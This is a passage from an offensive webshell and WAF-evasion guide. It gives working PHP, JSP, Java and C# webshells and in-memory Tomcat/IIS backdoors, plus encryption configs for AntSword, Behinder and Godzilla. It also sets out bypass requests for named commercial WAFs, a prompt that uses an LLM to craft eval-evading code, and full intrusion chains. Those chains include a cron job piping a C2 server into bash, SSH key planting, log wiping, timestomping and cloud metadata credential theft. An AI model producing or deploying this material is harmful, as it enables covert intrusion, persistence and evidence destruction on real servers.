            if random.random() > 0.5:
                pos = random.randint(0, len(lines))
                lines.insert(pos, block)
        return '\n'.join(lines)

    def flatten_control_flow(self, code):
        """Convert if-else chains to switch-case with opaque predicates"""
        # This is a simplified example; real implementation requires full AST
        dispatcher_var = self.generate_variable_name()
        flattened = f"""
        ${dispatcher_var} = {random.randint(1000, 9999)};
        switch (${dispatcher_var}) {{
            case {random.randint(1000, 9999)}:
                // Original logic here
                {code}
                break;
            default:
                // Dead default
                break;
        }}
        """
        return flattened

    def add_opaque_predicates(self, code):
        """Add conditions that always evaluate to true/false"""
        always_true = [
            'md5("a") == md5("a")',
            'strlen("hello") == 5',
            '1 + 1 == 2',
            'time() > 0',
            'phpversion() == phpversion()',
        ]
        always_false = [
            'md5("a") == md5("b")',
            'strlen("hello") == 6',
            '1 + 1 == 3',
            'time() < 0',
        ]
        pred = random.choice(always_true)
        return f"if ({pred}) {{\n{code}\n}}"
```

### 4.4 LLM-Based WAF Bypass

Use LLMs to analyze WAF rules and generate bypass payloads.

**Bypass strategy:**

```
1. Feed WAF rule set (if known) to LLM
2. LLM identifies rule patterns and edge cases
3. LLM generates payloads that evade those specific rules
4. Test generated payloads
5. LLM iteratively refines based on success/failure
```

**Example LLM prompt for WAF bypass:**

```
I have a WAF that blocks the pattern "eval\s*\(.*\)" in PHP files.
I need to execute code that uses eval. Generate 10 different PHP code
snippets that achieve the same effect as eval($code) but bypass this
WAF rule. Do not use the literal string "eval".
```

### 4.5 AI-Driven Polyglot WebShell

Generate WebShell files that are valid in multiple languages simultaneously.

**PHP + JPG polyglot:**

```
Create a file that is both a valid JPEG image and a valid PHP WebShell.
The JPEG header bytes must be preserved, and the PHP code must be
embedded in EXIF comments.

Command:
$ exiftool -Comment='<?php @eval($_POST["cmd"]); ?>' original.jpg -o shell.jpg
```

**PHP + PDF polyglot:**

```
%PDF-1.4
%<?php @eval($_POST['cmd']); __halt_compiler(); ?>
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
... (valid PDF structure continues)
```

---

## 5. WEBSHELL MANAGEMENT TOOLS (EVASION CONFIGURATION)

### 5.1 AntSword (蚁剑) Evasion Configuration

**Encoder customization for bypass:**

```javascript
// Custom AntSword encoder: AES-256-CBC + Base64
'use strict';

module.exports = (pwd, data, ext = {}) => {
    // Generate random IV
    let iv = '';
    for (let i = 0; i < 16; i++) {
        iv += String.fromCharCode(Math.floor(Math.random() * 256));
    }

    // AES-256-CBC encryption
    let CryptoJS = require('crypto-js');
    let key = CryptoJS.SHA256(pwd);
    let encrypted = CryptoJS.AES.encrypt(data, key, {
        iv: CryptoJS.enc.Latin1.parse(iv),
        mode: CryptoJS.mode.CBC,
        padding: CryptoJS.pad.Pkcs7
    });

    // Combine IV + ciphertext
    let payload = iv + encrypted.ciphertext.toString(CryptoJS.enc.Latin1);
    return Buffer.from(payload, 'latin1').toString('base64');
};
```

**AntSword custom decoder (PHP side):**

```php
<?php
// AntSword AES-256-CBC decoder
$pass = 'ant';
$payload = base64_decode($_POST[$pass]);
$iv = substr($payload, 0, 16);
$encrypted = substr($payload, 16);
$key = hash('sha256', $pass, true);
$data = openssl_decrypt($encrypted, 'aes-256-cbc', $key, OPENSSL_RAW_DATA, $iv);
@eval($data);
?>
```

**AntSword traffic masquerading configuration:**

```
HTTP Headers configuration in AntSword:
- User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
- Content-Type: application/x-www-form-urlencoded; charset=UTF-8
- Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
- Accept-Language: en-US,en;q=0.5
- Accept-Encoding: gzip, deflate
- X-Requested-With: XMLHttpRequest
- Connection: keep-alive
- Cookie: PHPSESSID=random_session_id
```

### 5.2 Behinder (冰蝎) Evasion Configuration

**Behinder 4.0+ evasion features:**

```
1. Dynamic key negotiation: Uses Diffie-Hellman key exchange
2. AES encryption with random IV per request
3. Binary payload transmission (not Base64)
4. Custom HTTP header encryption
5. Payload splitting across multiple HTTP headers
```

**Behinder custom configuration:**

```xml
<!-- Behinder config.xml customization -->
<config>
    <transport>
        <type>aes</type>
        <key_negotiation>dh</key_negotiation>
        <encode>base64</encode>
        <header_encrypt>true</header_encrypt>
    </transport>
    <request>
        <method>POST</method>
        <user_agent>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36</user_agent>
        <timeout>30000</timeout>
        <delay>0</delay>
        <headers>
            <X-Custom>value</X-Custom>
            <Accept-Language>zh-CN,zh;q=0.9</Accept-Language>
        </headers>
    </request>
    <obfuscation>
        <variable_randomization>true</variable_randomization>
        <string_encryption>xor</string_encryption>
        <function_obfuscation>true</function_obfuscation>
        <dead_code_injection>true</dead_code_injection>
    </obfuscation>
</config>
```

**Behinder traffic pattern concealment:**

```
Strategy: Make Behinder traffic look like legitimate API calls

1. Use REST-like URL patterns:
   POST /api/v1/status HTTP/1.1
   POST /api/v1/data/sync HTTP/1.1
   POST /api/v2/auth/refresh HTTP/1.1

2. Mimic common API response formats:
   {"code":200,"message":"success","data":{}}

3. Add realistic timing jitter:
   Random delay of 100-500ms between requests

4. Use HTTP/2 for multiplexing
```

### 5.3 Godzilla (哥斯拉) Evasion Configuration

**Godzilla payload encryption configuration:**

```java
// Godzilla Java payload encryption
public class GodzillaPayload {
    private static final String KEY = "3c6e0b8a9c15224a";
    private static final String IV = "1234567890abcdef";

    public static byte[] encrypt(byte[] data) throws Exception {
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        SecretKeySpec keySpec = new SecretKeySpec(KEY.getBytes(), "AES");
        IvParameterSpec ivSpec = new IvParameterSpec(IV.getBytes());
        cipher.init(Cipher.ENCRYPT_MODE, keySpec, ivSpec);
        return cipher.doFinal(data);
    }

    public static byte[] decrypt(byte[] data) throws Exception {
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        SecretKeySpec keySpec = new SecretKeySpec(KEY.getBytes(), "AES");
        IvParameterSpec ivSpec = new IvParameterSpec(IV.getBytes());
        cipher.init(Cipher.DECRYPT_MODE, keySpec, ivSpec);
        return cipher.doFinal(data);
    }
}
```

**Godzilla heartbeat packet configuration:**

```
Heartbeat interval: 30-60 seconds (randomized)
Heartbeat payload: Small, looks like keep-alive ping
Heartbeat response: Minimal, no data leakage

Example heartbeat disguised as:
  GET /favicon.ico HTTP/1.1
  Or: POST /api/heartbeat {"ts": 1234567890}
```

**Godzilla traffic obfuscation:**

```
1. Payload chunked across multiple POST parameters
2. Random parameter names per session
3. Response data hidden in HTML comments
4. Cookie-based session tracking
5. TLS 1.3 with custom cipher suites
```

---

## 6. MEMORY HORSE TECHNIQUES (内存马)

Memory horses reside entirely in server memory, leaving no files on disk, making them extremely difficult to detect through file-based scanning.

### 6.1 Java Filter Memory Horse

**Injection via JSP:**

```java
<%@ page import="java.io.*,java.lang.reflect.*,javax.servlet.*,javax.servlet.http.*,org.apache.catalina.core.*,org.apache.tomcat.util.descriptor.web.*" %>
<%
// Get the ServletContext
ServletContext ctx = request.getServletContext();
Field appCtxField = ctx.getClass().getDeclaredField("context");
appCtxField.setAccessible(true);
ApplicationContext appCtx = (ApplicationContext) appCtxField.get(ctx);

Field standardCtxField = appCtx.getClass().getDeclaredField("context");
standardCtxField.setAccessible(true);
StandardContext standardCtx = (StandardContext) standardCtxField.get(appCtx);

// Create filter
Filter filter = new Filter() {
    public void init(FilterConfig config) {}
    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain)
            throws IOException, ServletException {
        HttpServletRequest hreq = (HttpServletRequest) req;
        HttpServletResponse hresp = (HttpServletResponse) resp;
        String cmd = hreq.getParameter("cmd");
        if (cmd != null) {
            Process p = Runtime.getRuntime().exec(cmd);
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                hresp.getWriter().println(line);
            }
            return;
        }
        chain.doFilter(req, resp);
    }
    public void destroy() {}
};

// Register filter dynamically
FilterDef filterDef = new FilterDef();
filterDef.setFilterName("MemoryFilter");
filterDef.setFilterClass(filter.getClass().getName());
filterDef.setFilter(filter);
standardCtx.addFilterDef(filterDef);

FilterMap filterMap = new FilterMap();
filterMap.setFilterName("MemoryFilter");
filterMap.addURLPattern("/*");
standardCtx.addFilterMapBefore(filterMap);

// The filter is now active in memory
out.println("Memory filter injected successfully");
%>
```

**Tomcat Valve memory horse:**

```java
// Inject a Tomcat Valve into the pipeline
<%@ page import="org.apache.catalina.Valve,org.apache.catalina.connector.*,java.lang.reflect.*" %>
<%
// Get the StandardHost or StandardContext
Field pipelineField = request.getClass().getDeclaredField("request");
pipelineField.setAccessible(true);
Request req = (Request) pipelineField.get(request);
org.apache.catalina.Host host = req.getHost();

// Get the pipeline
Method getPipeline = host.getClass().getMethod("getPipeline");
org.apache.catalina.Pipeline pipeline = (org.apache.catalina.Pipeline) getPipeline.invoke(host);

// Add malicious valve
pipeline.addValve(new Valve() {
    public Valve getNext() { return null; }
    public void setNext(Valve v) {}
    public void backgroundProcess() {}
    public void invoke(Request rq, Response rp) throws IOException, ServletException {
        String cmd = rq.getParameter("cmd");
        if (cmd != null) {
            Process p = Runtime.getRuntime().exec(cmd);
            java.util.Scanner s = new java.util.Scanner(p.getInputStream()).useDelimiter("\\A");
            rp.getWriter().write(s.hasNext() ? s.next() : "");
            return;
        }
        getNext().invoke(rq, rp);
    }
    public boolean isAsyncSupported() { return false; }
});

out.println("Valve memory horse injected");
%>
```

### 6.2 Java Listener Memory Horse

```java
<%@ page import="javax.servlet.*,org.apache.catalina.core.*,java.lang.reflect.*" %>
<%
// Get StandardContext
ServletContext ctx = request.getServletContext();
Field f = ctx.getClass().getDeclaredField("context");
f.setAccessible(true);
ApplicationContext appCtx = (ApplicationContext) f.get(ctx);
f = appCtx.getClass().getDeclaredField("context");
f.setAccessible(true);
StandardContext stdCtx = (StandardContext) f.get(appCtx);

// Create malicious request listener
ServletRequestListener listener = new ServletRequestListener() {
    public void requestInitialized(ServletRequestEvent sre) {
        HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
        String cmd = req.getParameter("cmd");
        if (cmd != null) {
            try {
                Process p = Runtime.getRuntime().exec(cmd);
                java.util.Scanner s = new java.util.Scanner(p.getInputStream()).useDelimiter("\\A");
                req.setAttribute("result", s.hasNext() ? s.next() : "");
            } catch (Exception e) {}
        }
    }
    public void requestDestroyed(ServletRequestEvent sre) {
        HttpServletResponse resp = (HttpServletResponse) sre.getServletRequest()
            .getAttribute("javax.servlet.request.X");
        // Can't easily get response here; use a different approach
    }
};

stdCtx.addApplicationEventListener(listener);
out.println("Listener memory horse injected");
%>
```

### 6.3 Java Servlet Memory Horse

```java
<%@ page import="javax.servlet.*,javax.servlet.http.*,org.apache.catalina.core.*,java.lang.reflect.*" %>
<%
// Create a servlet wrapper
HttpServlet servlet = new HttpServlet() {
    protected void service(HttpServletRequest req, HttpServletResponse resp)
            throws ServletException, IOException {
        String cmd = req.getParameter("cmd");
        if (cmd != null) {
            try {
                Process p = Runtime.getRuntime().exec(cmd);
                java.util.Scanner s = new java.util.Scanner(p.getInputStream()).useDelimiter("\\A");
                resp.getWriter().write(s.hasNext() ? s.next() : "");
            } catch (Exception e) {
                resp.getWriter().write("Error: " + e.getMessage());
            }
        }
    }
};

// Get StandardContext
ServletContext ctx = request.getServletContext();
Field f = ctx.getClass().getDeclaredField("context");
f.setAccessible(true);
ApplicationContext appCtx = (ApplicationContext) f.get(ctx);
f = appCtx.getClass().getDeclaredField("context");
f.setAccessible(true);
StandardContext stdCtx = (StandardContext) f.get(appCtx);

// Create wrapper and add servlet
org.apache.catalina.Wrapper wrapper = stdCtx.createWrapper();
wrapper.setName("MemoryServlet");
wrapper.setServletClass(servlet.getClass().getName());
wrapper.setServlet(servlet);
stdCtx.addChild(wrapper);
stdCtx.addServletMappingDecoded("/memory/*", "MemoryServlet");

out.println("Servlet memory horse injected at /memory/*");
%>
```

### 6.4 Godzilla Memory Horse

Godzilla's memory horse is injected via Java agent or JSP, using advanced techniques to hide from memory scanners.

**Godzilla memory horse injection concept:**

```
1. Attach as Java Agent (.jar)
2. Use Instrumentation API to modify loaded classes
3. Inject into Tomcat/Jetty/Undertow/WebLogic/WebSphere pipeline
4. Hook into FilterChain.doFilter() or Servlet.service()
5. Use Unsafe or JNI to hide from memory scanners
6. Encrypt communication using custom cipher
```

**Godzilla filter chain hook injection:**

```java
// Pseudo-code for Godzilla-style memory horse injection
Class<?> filterChainClass = Class.forName("org.apache.catalina.core.ApplicationFilterChain");
Method doFilterMethod = filterChainClass.getDeclaredMethod("internalDoFilter",
    ServletRequest.class, ServletResponse.class);

// Use ASM/Javassist to modify bytecode of doFilter
ClassPool pool = ClassPool.getDefault();
CtClass ctClass = pool.get("org.apache.catalina.core.ApplicationFilterChain");
CtMethod ctMethod = ctClass.getDeclaredMethod("internalDoFilter");

ctMethod.insertBefore("""
    if (request.getParameter("godzilla_pass") != null) {
        // Godzilla protocol handler
        byte[] cmd = GodzillaCipher.decrypt(request.getParameter("data"));
        byte[] result = GodzillaExecutor.execute(cmd);
        response.getWriter().write(GodzillaCipher.encrypt(result));
        return;
    }
""");

// Load modified class into JVM
ctClass.toClass();
```

### 6.5 PHP Memory Horse

PHP memory horses are more challenging but possible through PHP-FPM process manipulation or shared memory.

**PHP 7.4+ FFI-based memory horse:**

```php
<?php
// PHP FFI (Foreign Function Interface) memory horse
// Requires PHP 7.4+ with FFI enabled
$ffi = FFI::cdef("
    typedef struct {
        // ... PHP internal structures
    } zend_execute_data;
    // ...
", "libphp.so");

// Hook into the PHP execution pipeline
// This is highly version-dependent and requires deep knowledge of PHP internals
// Real implementation would need to match exact PHP version structures
?>
```

**PHP-FPM persistent process abuse:**

```php
<?php
// PHP-FPM keeps processes alive between requests
// Store state in shared memory or APCu
$key = 'memhorse_' . md5(__FILE__);
if (apcu_exists($key)) {
    $config = apcu_fetch($key);
    if (isset($_POST['pass']) && $_POST['pass'] === $config['pass']) {
        eval($_POST['code']);
    }
} else {
    // First run: store configuration
    apcu_store($key, [
        'pass' => 'admin2026',
        'created' => time(),
        'file' => __FILE__,
    ]);
    // Return 404 on first access
    http_response_code(404);
    exit;
}
?>
```

### 6.6 ASP.NET Memory Horse

**ASP.NET IIS Module injection via C#:**

```csharp
// ASP.NET Memory Horse via GAC assembly injection
using System;
using System.Web;
using Microsoft.Web.Administration;

public class MemoryModule : IHttpModule
{
    public void Init(HttpApplication context)
    {
        context.BeginRequest += new EventHandler(OnBeginRequest);
    }

    void OnBeginRequest(object sender, EventArgs e)
    {
        HttpApplication app = (HttpApplication)sender;
        HttpContext ctx = app.Context;
        string cmd = ctx.Request.Params["cmd"];
        if (!string.IsNullOrEmpty(cmd))
        {
            System.Diagnostics.Process p = new System.Diagnostics.Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c " + cmd;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.UseShellExecute = false;
            p.Start();
            ctx.Response.Write(p.StandardOutput.ReadToEnd());
            ctx.Response.End();
        }
    }

    public void Dispose() { }
}

// Dynamic registration via ServerManager
using (ServerManager serverManager = new ServerManager())
{
    var config = serverManager.GetApplicationHostConfiguration();
    var modulesSection = config.GetSection("system.webServer/modules");
    // Add module to the pipeline
    // This requires admin privileges on IIS
}
```

---

## 7. 2026 LATEST DETECTION BYPASS

### 7.1 Alibaba Cloud WAF (阿里云 WAF) Bypass

**Known bypass vectors for Alibaba Cloud WAF:**

```
1. Chunked Transfer Encoding bypass
   Alibaba WAF may not fully reassemble chunked bodies before inspection.

2. Content-Type manipulation
   Use multipart/form-data with boundary tricks.

3. HTTP Parameter Pollution (HPP)
   Send duplicate parameters; WAF inspects first, application uses last.

4. Unicode normalization bypass
   Alibaba WAF may normalize Unicode differently than the backend.

5. HTTP/2 to HTTP/1.1 downgrade attacks
   Send via HTTP/2, WAF inspects HTTP/1.1 version.

6. JSON body encoding
   Send payload in JSON format; WAF may not inspect JSON deeply.

7. Base64 within JSON
   Encode payload as Base64 inside JSON values.

8. Protobuf/gRPC payload
   Use protobuf encoding; WAF may not support protobuf inspection.
```

**Alibaba Cloud WAF bypass payload example:**

```http
POST /upload.php HTTP/1.1
Host: target.aliyuncs.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Transfer-Encoding: chunked

1a
------WebKitFormBoundary
0d
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

0d

<?php
$a = $_REQUEST['a'];
if($a){@eval($a);}
?>

0d
------WebKitFormBoundary--
0

```

### 7.2 Tencent Cloud WAF (腾讯云 WAF) Bypass

```
1. SQL injection bypass via MySQL comment tricks
   /*!50000SELECT*/ instead of SELECT

2. XSS bypass via event handler obfuscation
   <img src=x onerror=eval(atob('base64_payload'))>

3. File upload bypass via double extension
   shell.php.jpg or shell.php%00.jpg

4. HTTP/2 multiplexing
   Send concurrent streams; WAF may not correlate across streams.

5. TLS fingerprint spoofing
   Use custom TLS client hello to mimic legitimate browsers.

6. Case variation
   Eval → EvAl → EVAL → eVAL

7. Tab/newline injection in headers
   X-Forwarded-For:\t127.0.0.1
```

### 7.3 Cloudflare WAF Bypass

```
1. Cloudflare allows certain paths by default
   /admin/, /api/, /wp-admin/ may have different rules.

2. Origin IP discovery
   If Cloudflare is reverse proxy, find origin IP and bypass entirely.

3. WebSocket upgrade
   Upgrade to WebSocket; Cloudflare may not inspect WS frames.

4. HTTP/2 Cleartext (h2c) upgrade
   Upgrade from HTTP/1.1 to h2c; bypasses Cloudflare inspection.

5. Cache poisoning + WAF bypass
   Poison Cloudflare cache with allowed response; WAF caches the bypass.

6. Large payload overflow
   Send payload larger than Cloudflare inspection limit (typically 128MB).

7. Rate limit bypass
   Distribute requests across multiple IPs and subdomains.

8. Cloudflare Transform Rules bypass
   Manipulate headers that Cloudflare adds/removes.
```

### 7.4 Imperva WAF Bypass

```
1. Imperva decoding order abuse
   Exploit the order Imperva decodes URL/HTML/Base64 vs. backend.

2. Double URL encoding
   %2527 → %27 → ' (Imperva decodes once, backend decodes twice)

3. Null byte injection
   shell.php%00.jpg → Imperva sees .jpg, backend sees .php

4. Request smuggling
   CL.TE or TE.CL smuggling against Imperva proxy.

5. Custom encoding
   IBM code page, UTF-7, UTF-16, UCS-2 encoding bypass.

6. Imperva-specific header bypass
   Some Imperva deployments ignore custom headers.
```

---

## 8. ONE-SHOT WEBSHELL (一过性 WebShell)

One-shot WebShells execute a single command and then self-destruct or leave no trace.

### 8.1 Fileless WebShell (Memory-Only)

**PHP eval-in-memory:**

```php
<?php
// This WebShell never writes to disk after initial placement
// Execute command, return result, and produce no persistent artifacts
$cmd = $_POST['cmd'] ?? '';
if ($cmd) {
    $result = `$cmd 2>&1`;
    echo base64_encode($result);
    // No file operations, no database writes, no logs
}
?>
```

### 8.2 Log-Based WebShell

**Apache/Nginx log poisoning to create WebShell:**

```
Step 1: Inject PHP code into access log
  curl -H "User-Agent: <?php @eval(\$_POST['cmd']); ?>" http://target/

Step 2: Access log file via LFI
  http://target/index.php?file=/var/log/apache2/access.log

Step 3: Execute commands via the log
  POST /index.php?file=/var/log/apache2/access.log
  cmd=system('id');
```

**PHP session file poisoning:**

```php
<?php
// Step 1: Upload a file that sets a PHP session variable
// Step 2: Session file contains: cmd|s:4:"whoami";
// Step 3: Include session file via LFI
// Step 4: PHP unserializes and executes
?>
```

### 8.3 Registry-Based WebShell (Windows/IIS)

```
Windows Registry path for IIS configurations:
  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W3SVC\Parameters

Concept:
1. Write a malicious ISAPI filter DLL path to the registry
2. IIS loads the DLL on next restart
3. DLL acts as a WebShell

Or use AppInit_DLLs:
  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows
  AppInit_DLLs = C:\malicious.dll
```

### 8.4 Scheduled Task-Based WebShell

**Windows scheduled task persistence:**

```
# Create a scheduled task that runs a PowerShell WebShell listener
schtasks /create /tn "WindowsUpdate" /tr "powershell -WindowStyle Hidden -Command ..." /sc daily /st 02:00
```

**Linux cron-based persistence:**

```
# Add a cron job that periodically checks for commands
*/5 * * * * curl -s http://c2-server/cmd | bash
```

### 8.5 Self-Destructing WebShell

```php
<?php
// Execute command and then delete itself
$cmd = $_POST['cmd'] ?? '';
if ($cmd) {
    $result = shell_exec($cmd . ' 2>&1');
    echo $result;

    // Self-destruct after execution
    unlink(__FILE__);

    // OR: overwrite with benign content
    file_put_contents(__FILE__, '<?php /* empty */ ?>');
}
?>
```

**Conditional self-destruct:**

```php
<?php
// Self-destruct after N executions
$counter_file = sys_get_temp_dir() . '/.counter_' . md5(__FILE__);
$count = (int)@file_get_contents($counter_file);
$count++;

if ($count >= 5) {
    // After 5 uses, remove all traces
    @unlink($counter_file);
    @unlink(__FILE__);
    exit('Expired');
}

@file_put_contents($counter_file, $count);
@eval($_POST['code']);
?>
```

---

## 9. WAF PENETRATION (WAF 穿透传递)

### 9.1 Chunked Transfer Encoding

**HTTP request with chunked encoding:**

```http
POST /upload.php HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded

1a
param1=value1&param2=
15
value2&pass=admin&c=
b
whoami&cmd=
a
id&param3=
10
value3&param4=value4
0

```

**Burp Suite Turbo Intruder chunked bypass script:**

```python
# Turbo Intruder script for chunked transfer bypass
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=5,
        engine=Engine.BURP2
    )

    # Build chunked request
    payload = "<?php @eval($_POST['cmd']); ?>"
    chunk_size = hex(len(payload))[2:]

    request = f"""POST /upload.php HTTP/1.1
Host: {target.host}
Transfer-Encoding: chunked
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

{chunk_size}
{payload}
0

"""

    engine.queue(request)
```

### 9.2 Compression-Based Bypass

**Gzip-compressed request body:**

```python
import gzip
import requests
import base64

payload = b'<?php @eval($_POST["cmd"]); ?>'
compressed = gzip.compress(payload)

# Option 1: Send as gzip-compressed body
headers = {
    'Content-Encoding': 'gzip',
    'Content-Type': 'application/x-www-form-urlencoded',
}
r = requests.post('http://target.com/upload.php', data=compressed, headers=headers)

# Option 2: Brotli compression
import brotli
compressed_br = brotli.compress(payload)
headers['Content-Encoding'] = 'br'
r = requests.post('http://target.com/upload.php', data=compressed_br, headers=headers)
```

### 9.3 TLS Fingerprint Masquerading

**JA3/JA4 fingerprint spoofing:**

```python
# Using Python with custom TLS library for JA3 fingerprint spoofing
# tls_client or curl_cffi can be used

import tls_client

session = tls_client.Session(
    client_identifier="chrome_120",  # Mimics Chrome 120 TLS fingerprint
    random_tls_extension_order=True   # Randomize TLS extension order
)

response = session.post(
    'https://target.com/upload.php',
    data={'file': open('shell.php', 'rb')},
    headers={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
    }
)
```

**curl_cffi for TLS fingerprint bypass:**

```bash
# Using curl_cffi to impersonate Chrome
python3 -c "
from curl_cffi import requests
r = requests.post('https://target.com/upload.php',
    impersonate='chrome120',
    files={'file': open('shell.php', 'rb')}
)
print(r.status_code)
"
```

### 9.4 HTTP/2 Multiplexing

**HTTP/2 multiplexing for WAF bypass:**

```
Concept: WAF may inspect streams independently, losing correlation
between multiple streams in the same connection.

Attack:
1. Open HTTP/2 connection
2. Stream 1: Send benign request (normal file upload)
3. Stream 2: Send malicious request simultaneously
4. WAF inspects Stream 1, lets Stream 2 through
5. Or: Split payload across multiple streams
```

**Python HTTP/2 multiplexing:**

```python
import h2.connection
import h2.config
import socket
import ssl

# Create HTTP/2 connection
ctx = ssl.create_default_context()
ctx.set_alpn_protocols(['h2'])

sock = socket.create_connection(('target.com', 443))
tls_sock = ctx.wrap_socket(sock, server_hostname='target.com')

config = h2.config.H2Configuration(client_side=True)
conn = h2.connection.H2Connection(config=config)
conn.initiate_connection()
tls_sock.sendall(conn.data_to_send())

# Stream 1: Benign request
conn.send_headers(1, [
    (':method', 'POST'),
    (':path', '/upload.php'),
    (':authority', 'target.com'),
    (':scheme', 'https'),
    ('content-type', 'multipart/form-data'),
])
conn.send_data(1, b'benign data', end_stream=True)

# Stream 3: Malicious request (simultaneous)
conn.send_headers(3, [
    (':method', 'POST'),
    (':path', '/upload.php'),
    (':authority', 'target.com'),
    (':scheme', 'https'),
    ('content-type', 'image/png'),
])
conn.send_data(3, b'<?php @eval($_POST["cmd"]); ?>', end_stream=True)

tls_sock.sendall(conn.data_to_send())
```

### 9.5 HTTP Request Smuggling for WAF Bypass

**CL.TE smuggling to bypass WAF:**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

In this attack, the front-end (WAF) uses Content-Length and sees a 6-byte body "0\r\n\r\nG". The back-end uses Transfer-Encoding and sees the start of a new request "G" followed by the next request, potentially bypassing WAF inspection.

---

## 10. REAL-WORLD SCENARIOS (实战场景)

### 10.1 Full Chain: File Upload Bypass + Evasion + Persistence

**Scenario: PHP web application with file upload restricted to images only.**

```
Phase 1: Reconnaissance
  - Identify upload endpoint: POST /profile/avatar/upload
  - Identify allowed extensions: jpg, png, gif
  - Identify WAF: Cloudflare
  - Identify backend: PHP 8.1, Apache 2.4

Phase 2: File Upload Bypass
  Attempt 1: Direct .php upload → Blocked (extension check)
  Attempt 2: shell.php.jpg → Blocked (WAF inspects MIME)
  Attempt 3: shell.php%00.jpg → Blocked (PHP 8.1 fixed null byte)
  Attempt 4: shell.pHp → Blocked (case-insensitive check)
  Attempt 5: .htaccess upload → Blocked (filename blacklist)
  Attempt 6: shell.jpg with PHP code in EXIF → Uploaded!

  Method: exiftool -Comment='<?php if(isset($_REQUEST["x"])){@eval($_REQUEST["x"]);} ?>' avatar.jpg

Phase 3: Trigger WebShell
  - Find the uploaded file path: /uploads/avatars/1234567890.jpg
  - Include via LFI: /profile/view?file=../../../uploads/avatars/1234567890.jpg
  - Or: rename to .php via another vulnerability

Phase 4: Establish Persistence
  - Deploy obfuscated WebShell to multiple locations:
    * /uploads/avatars/config.php (disguised as config)
    * /images/logo.php (disguised as image)
    * /cache/.cache.php (hidden file)
    * /tmp/sess_abc123 (in PHP session directory)

  - Add cron job via WebShell:
    echo '* * * * * curl -s http://c2-server/beacon | bash' >> /var/spool/cron/crontabs/www-data

  - Create .ssh/authorized_keys:
    echo 'ssh-rsa AAAAB3...' >> /home/www-data/.ssh/authorized_keys

  - Deploy memory horse (if Java/Tomcat):
    Filter memory horse injection as shown in Section 6

Phase 5: Cleanup
  - Remove original upload traces
  - Clear web server logs:
    sed -i '/upload.*avatar/d' /var/log/apache2/access.log
  - Restore file timestamps:
    touch -r /etc/passwd /uploads/avatars/config.php
```

### 10.2 Scenario: WAF-Protected Enterprise Environment

**Target: Enterprise Java application behind Alibaba Cloud WAF + Imperva.**

```
Phase 1: WAF Fingerprinting
  - Alibaba Cloud: Response headers (X-Cache, ali-cdn)
  - Imperva: Response headers (X-Iinfo, X-CDN)

Phase 2: Initial Access
  - Exploit SQL injection in search endpoint (bypassing WAF via HPP)
  - Extract admin credentials from database
  - Login to admin panel

Phase 3: WebShell Deployment
  - Admin panel has "template editor" feature
  - Edit a JSP template to include WebShell:
    <%@ page import="java.io.*" %>
    <%
    String p = request.getParameter("p");
    if (p != null && p.equals(System.getProperty("custom.key"))) {
        Process proc = Runtime.getRuntime().exec(request.getParameter("c"));
        BufferedReader reader = new BufferedReader(
            new InputStreamReader(proc.getInputStream()));
        String line;
        while ((line = reader.readLine()) != null) out.println(line);
    }
    %>

  - The WebShell is hidden in legitimate application code
  - WAF sees it as normal application traffic

Phase 4: Traffic Tunneling
  - Use WebSocket for C2 communication:
    * Upgrade connection to WebSocket
    * WAF often doesn't inspect WebSocket frames deeply
    * Encrypt payload within WebSocket frames

  - Or use DNS tunneling for C2:
    * Encode commands in DNS queries
    * exfiltrate data in DNS responses
    * Tools: dnscat2, iodine

Phase 5: Lateral Movement
  - From WebShell, scan internal network
  - Find database servers, file servers, domain controllers
  - Use stolen credentials for lateral movement
  - Deploy additional persistence mechanisms
```

### 10.3 Scenario: Cloud-Native Environment (AWS/GCP/Azure)

**Target: Kubernetes-hosted application with containerized WebShell.**

```
Phase 1: Container WebShell
  - Deploy WebShell as a sidecar container or via compromised pod
  - Minimal WebShell Dockerfile:
    FROM alpine:latest
    RUN apk add --no-cache php
    COPY shell.php /var/www/html/shell.php
    CMD ["php", "-S", "0.0.0.0:8080", "-t", "/var/www/html"]

Phase 2: Kubernetes Persistence
  - Create a privileged pod:
    apiVersion: v1
    kind: Pod
    metadata:
      name: debug-pod
spec:
  containers:
  - name: debug
    image: alpine
    command: ["/bin/sh", "-c", "while true; do sleep 3600; done"]
    volumeMounts:
    - name: host
      mountPath: /host
    securityContext:
      privileged: true
  volumes:
  - name: host
    hostPath:
      path: /

  - From this pod, access host filesystem
  - Deploy WebShell to host node

Phase 3: Cloud Metadata Exploitation
  - From WebShell, access cloud metadata services:
    curl http://169.254.169.254/latest/meta-data/  (AWS)
    curl http://metadata.google.internal/  (GCP)
    curl http://169.254.169.254/metadata/instance?api-version=2021-02-01  (Azure)

  - Extract IAM credentials and use them for cloud API access
  - Create persistent backdoor IAM users/roles
```

### 10.4 Scenario: Evasion Testing Checklist

```
[ ] Static analysis evasion
    [ ] No known malicious strings detected
    [ ] Variable names randomized
    [ ] Function names obfuscated
    [ ] String literals fragmented
    [ ] Comments injected
